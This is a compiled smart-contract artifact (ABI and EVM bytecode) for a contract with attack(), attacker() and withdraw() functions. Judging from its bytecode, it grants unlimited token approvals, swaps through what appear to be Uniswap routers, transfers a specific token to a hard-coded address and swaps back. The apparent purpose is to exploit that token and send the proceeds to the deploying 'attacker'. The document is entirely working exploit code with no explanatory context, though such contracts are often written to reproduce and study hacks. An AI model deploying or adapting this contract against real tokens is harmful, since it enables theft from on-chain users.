{"abi":[{"type":"constructor","inputs":[],"stateMutability":"nonpayable"},{"type":"fallback","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"attacker","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address payable"}],"stateMutability":"view"},{"type":"function","name":"withdraw","inputs":[],"outputs":[],"stateMutability":"payable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b505f80546001600160a01b031916331790556107818061002d5f395ff3fe608060405260043610610033575f3560e01c80633ccfd60b1461003557806348eb76ee1461003d5780639e5faafc14610077575b005b61003361008b565b348015610048575f5ffd5b505f5461005b906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b348015610082575f5ffd5b5061003361011b565b5f546001600160a01b031633146100e15760405162461bcd60e51b81526020600482015260166024820152752737ba103a34329031b7b73a3930b1ba1037bbb732b960511b604482015260640160405180910390fd5b5f80546040516001600160a01b03909116914780156108fc02929091818181858888f19350505050158015610118573d5f5f3e3d5ffd5b50565b60405163095ea7b360e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d60048201525f19602482015273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc29063095ea7b3906044016020604051808303815f875af1158015610184573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101a8919061068a565b5060405163095ea7b360e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d60048201525f19602482015273d1456d1b9ceb59abd4423a49d40942a9485ceef69063095ea7b3906044016020604051808303815f875af1158015610212573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610236919061068a565b5060405163095ea7b360e01b81527368b3465833fb72a70ecdf485e0e4c7bd8665fc4560048201525f19602482015273d1456d1b9ceb59abd4423a49d40942a9485ceef69063095ea7b3906044016020604051808303815f875af11580156102a0573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102c4919061068a565b5073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc26001600160a01b031663d0e30db066f8b0a10e4700006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610319575f5ffd5b505af115801561032b573d5f5f3e3d5ffd5b505f93506002925061033b915050565b604051908082528060200260200182016040528015610364578160200160208202803683370190505b50905073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2815f8151811061038e5761038e6106b0565b60200260200101906001600160a01b031690816001600160a01b03168152505073d1456d1b9ceb59abd4423a49d40942a9485ceef6816001815181106103d6576103d66106b0565b6001600160a01b0390921660209283029190910190910152604051635c11d79560e01b8152737a250d5630b4cf539739df2c5dacb4c659f2488d90635c11d7959061043b9066f8b0a10e47000090600190869030906503eed5cf5404906004016106c4565b5f604051808303815f87803b158015610452575f5ffd5b505af1158015610464573d5f5f3e3d5ffd5b505060405163a9059cbb60e01b815273b23fc1241e1bc1a5542a438775809d38099838fe6004820152670de0b6b3a7640000602482015273d1456d1b9ceb59abd4423a49d40942a9485ceef6925063a9059cbb91506044016020604051808303815f875af11580156104d8573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104fc919061068a565b506040805160e08101825273d1456d1b9ceb59abd4423a49d40942a9485ceef6815273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc26020820190815261271082840190815230606084019081526914f6ccfe338517e00000608085019081525f60a0860181815260c0870191825296516304e45aaf60e01b815286516001600160a01b039081166004830152955186166024820152935162ffffff166044850152915184166064840152516084830152935160a482015292511660c4830152907368b3465833fb72a70ecdf485e0e4c7bd8665fc45906304e45aaf9060e4016020604051808303815f875af11580156105f9573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061061d9190610734565b50604051632e1a7d4d60e01b8152680d836812e04ebf832c600482015273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc290632e1a7d4d906024015f604051808303815f87803b158015610670575f5ffd5b505af1158015610682573d5f5f3e3d5ffd5b505050505050565b5f6020828403121561069a575f5ffd5b815180151581146106a9575f5ffd5b9392505050565b634e487b7160e01b5f52603260045260245ffd5b5f60a0820187835286602084015260a0604084015280865180835260c0850191506020880192505f5b818110156107145783516001600160a01b03168352602093840193909201916001016106ed565b50506001600160a01b039590951660608401525050608001529392505050565b5f60208284031215610744575f5ffd5b505191905056fea2646970667358221220239e2d8ce5db96a2d27f02ce9fb8fae88521bc05dfeb416c21bee02530db233064736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","attacker()":"48eb76ee","withdraw()":"3ccfd60b"},"id":551}